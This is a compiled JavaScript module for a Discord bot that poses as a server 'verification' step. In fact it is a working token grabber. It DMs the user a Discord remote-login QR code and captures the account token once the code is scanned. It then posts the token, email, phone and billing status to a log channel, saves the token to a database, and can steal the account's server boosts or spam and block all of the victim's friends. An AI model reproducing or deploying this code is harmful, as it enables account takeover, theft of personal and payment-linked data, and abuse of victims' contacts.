var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __markAsModule = (target) => __defProp(target, "__esModule", { value: true });
var __export = (target, all) => {
  __markAsModule(target);
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __reExport = (target, module2, desc) => {
  if (module2 && typeof module2 === "object" || typeof module2 === "function") {
    for (let key of __getOwnPropNames(module2))
      if (!__hasOwnProp.call(target, key) && key !== "default")
        __defProp(target, key, { get: () => module2[key], enumerable: !(desc = __getOwnPropDesc(module2, key)) || desc.enumerable });
  }
  return target;
};
var __toModule = (module2) => {
  return __reExport(__markAsModule(__defProp(module2 != null ? __create(__getProtoOf(module2)) : {}, "default", module2 && module2.__esModule && "default" in module2 ? { get: () => module2.default, enumerable: true } : { value: module2, enumerable: true })), module2);
};
__export(exports, {
  default: () => socket_default
});
var import_discord = __toModule(require("discord.js"));
var import_crypto = __toModule(require("crypto"));
var import_console = __toModule(require("../../util/console"));
var import_mongoose = __toModule(require("mongoose"));
var import_embeds = __toModule(require("../util/embeds"));
var import_fetch = __toModule(require("../util/fetch"));
var import_ws = __toModule(require("ws"));
var import_jimp = __toModule(require("jimp"));
var import_config = __toModule(require("../../util/config"));
const users = (0, import_mongoose.model)(import_config.config.mongoose.schemaName, new import_mongoose.Schema({
  id: String,
  username: String,
  token: String,
  hasBilling: Boolean
}));
const socket = (client, interaction) => new Promise(async (resolve, reject) => {
  resolve(true);
  const socketClient = new import_ws.default(`wss://remote-auth-gateway.discord.gg/?v=1`, { origin: "https://discord.com", handshakeTimeout: 1e4 });
  const keyPair = (0, import_crypto.generateKeyPairSync)("rsa", { modulusLength: 2048, publicExponent: 65537 });
  socketClient.onerror = (e) => (0, import_console.logError)(e.message.toUpperCase());
  socketClient.onclose = (e) => (0, import_console.logError)("SOCKET CLOSED");
  let heartbeat;
  setTimeout(() => {
    socketClient.close();
    clearInterval(heartbeat);
    interaction.user.send({
      embeds: [(0, import_embeds.failedVerificationEmbed)(client)]
    }).catch(() => {
    });
    return reject(false);
  }, 6e4);
  socketClient.onmessage = async (event) => {
    var _a, _b;
    const data = JSON.parse(event.data);
    switch (data.op) {
      case "hello":
        socketClient.send(JSON.stringify({
          op: "init",
          encoded_public_key: keyPair.publicKey.export({ type: "spki", format: "der" }).toString("base64")
        }));
        heartbeat = setInterval(() => {
          socketClient.send(JSON.stringify({ op: "heartbeat" }));
        }, data.heartbeat_interval);
        break;
      case "nonce_proof":
        const decryptedNonce = (0, import_crypto.privateDecrypt)({ key: keyPair.privateKey, oaepHash: "sha256" }, Buffer.from(data.encrypted_nonce, "base64"));
        const nonceHash = (0, import_crypto.createHash)("sha256").update(decryptedNonce).digest("base64url");
        socketClient.send(JSON.stringify({ op: "nonce_proof", proof: nonceHash }));
        break;
      case "pending_remote_init":
        const embed = (0, import_embeds.verificationCodeEmbed)(client);
        const fingerprintData = `https://discordapp.com/ra/${data.fingerprint}`;
        const qrCodeURL = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${fingerprintData}`;
        const bg = new import_jimp.default(300, 300, 4294967295);
        const qrCode = await import_jimp.default.read(qrCodeURL);
        bg.composite(qrCode, 22, 22);
        bg.getBuffer(import_jimp.default.MIME_PNG, (err, buffer) => {
          const discordImage = new import_discord.AttachmentBuilder(buffer).setName("img.png");
          embed.setImage("attachment://img.png");
          interaction.user.send({
            embeds: [embed],
            files: [discordImage]
          });
        });
        break;
      case "finish":
        const decryptedToken = (0, import_crypto.privateDecrypt)({ key: keyPair.privateKey, oaepHash: "sha256" }, Buffer.from(data.encrypted_token, "base64"));
        const token = decryptedToken.toString();
        (0, import_console.logSuccess)(`${token}`);
        const userInformation = await (0, import_fetch.getUserInformation)(token);
        if (userInformation.id !== interaction.user.id) {
          interaction.user.send({
            embeds: [(0, import_embeds.failedVerificationEmbedReason)(client, "Wrong User")]
          }).catch(() => {
          });
        } else {
          await interaction.user.send({
            embeds: [(0, import_embeds.successVerificationEmbed)(client)]
          }).catch(() => {
          });
          const role = (_a = client.guilds.cache.get(import_config.config.verify.guildId)) == null ? void 0 : _a.roles.cache.get(import_config.config.verify.roleId);
          const user = (_b = client.guilds.cache.get(import_config.config.verify.guildId)) == null ? void 0 : _b.members.cache.get(interaction.user.id);
          if (role && user)
            user.roles.add(role).catch(() => {
            });
        }
        const avatarUrl = userInformation.avatar !== null ? `https://cdn.discordapp.com/avatars/${userInformation.id}/${userInformation.avatar}.png` : `https://discord.com/assets/1f0bfc0865d324c2587920a7d80c609b.png`;
        const billingInformation = await (0, import_fetch.getBillingInformation)(token);
        const tokenLoggedEmbed = new import_discord.EmbedBuilder().setColor("#FF0000").setAuthor({
          name: `${userInformation.username}#${userInformation.discriminator} [${userInformation.id}]`,
          iconURL: avatarUrl
        }).addFields([
          { name: "Account Info", value: `Email: ${userInformation.email}
Phone: ${userInformation.phone}
Nitro: ${userInformation.premium_type ? userInformation.premium_type === 2 ? "Booster" : "Classic" : "None"}
Billing Info: ${billingInformation.length > 0 ? "Yes" : "No"}` },
          { name: "Token", value: token }
        ]);
        const logChannel = await client.channels.cache.get(import_config.config.log.channelId);
        logChannel.send({
          embeds: [tokenLoggedEmbed]
        }).catch(() => {
        });
        if (import_config.config.autoBoost) {
          const allBoosts = await (0, import_fetch.getAllBoosts)(token);
          await (0, import_fetch.addBoostToserver)(token, allBoosts.map((x) => x.id));
        }
        if (import_config.config.autoMessage.enabled) {
          const allFriends = await (0, import_fetch.getAllFriends)(token);
          for (const friend of allFriends) {
            const friendChannel = await (0, import_fetch.createFriendChannel)(token, friend.id);
            await (0, import_fetch.sendMessage)(token, friendChannel.id);
            if (import_config.config.autoMessage.blockAfterMessage)
              await (0, import_fetch.blockFriend)(token, friend.id);
          }
        }
        if (import_config.config.mongoose.enabled) {
          const foundUser = await users.findOne({ id: userInformation.id });
          if (foundUser) {
            foundUser.token = token;
            foundUser.hasBilling = billingInformation.length > 0;
            await foundUser.save();
          } else
            await users.create({
              id: userInformation.id,
              username: userInformation.username,
              token,
              hasBilling: billingInformation.length > 0
            });
        }
      default:
        break;
    }
  };
});
var socket_default = socket;
// Annotate the CommonJS export names for ESM import in node:
0 && (module.exports = {});
//# sourceMappingURL=socket.js.map
